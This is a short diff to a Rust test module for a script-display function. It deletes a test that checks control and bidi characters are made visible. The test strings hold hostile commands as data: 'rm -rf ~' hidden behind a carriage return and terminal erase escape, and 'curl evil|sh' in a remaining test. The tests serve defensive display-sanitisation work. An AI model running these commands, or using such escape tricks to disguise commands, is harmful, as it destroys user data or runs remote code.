@@ -794,15 +794,6 @@ mod tests {
     }
 
     #[test]
-    fn script_rows_make_control_and_bidi_characters_visible() {
-        let rows = wrapped_script("echo ok\r\x1b[2Krm -rf ~\tnow \u{202E}fdp.", 80);
-        assert_eq!(
-            rows,
-            vec!["echo ok\\r\\u{1b}[2Krm -rf ~\\tnow \\u{202e}fdp."]
-        );
-    }
-
-    #[test]
     fn script_rows_wrap_long_lines_keeping_whitespace() {
         let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(20));
         let rows = wrapped_script(&script, 16);
